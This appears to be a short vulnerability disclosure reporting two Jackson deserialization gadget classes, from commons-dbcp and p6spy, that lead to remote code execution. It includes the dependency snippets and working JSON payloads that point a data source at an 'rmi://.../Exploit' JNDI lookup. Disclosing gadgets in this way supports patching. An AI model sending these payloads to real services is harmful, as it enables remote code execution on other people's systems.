I found two gadgets can cause jackson deserialization rce。

first:
      use dependency commons-dbcp。Its configuration file is as follows：
<dependency>
    <groupId>commons-dbcp</groupId>
    <artifactId>commons-dbcp</artifactId>
    <version>1.4</version>
</dependency>
The test validation code is as follows：

// partial, only include the meat
String poc2 = "[\"org.apache.commons.dbcp.datasources.SharedPoolDataSource\", {\"dataSourceName\": \"rmi://127.0.0.1:1389/Exploit\"}]";

Any subclass of org.apache.commons.dbcp.datasources.InstanceKeyDataSource Can cause rce

---

second:

use dependency p6spy。Its configuration file is as follows：

<dependency>
    <groupId>p6spy</groupId>
    <artifactId>p6spy</artifactId>
    <version>3.8.6</version>
</dependency>
The test validation code is as follows：

String poc2 = "[\"com.p6spy.engine.spy.P6DataSource\", {\"realDataSource\": \"rmi://127.0.0.1:1389/Exploit\"}]";

---

Metadata:

vuln discoverer:
    b5mali4

vuln discoverer email:
    root@codersec.net
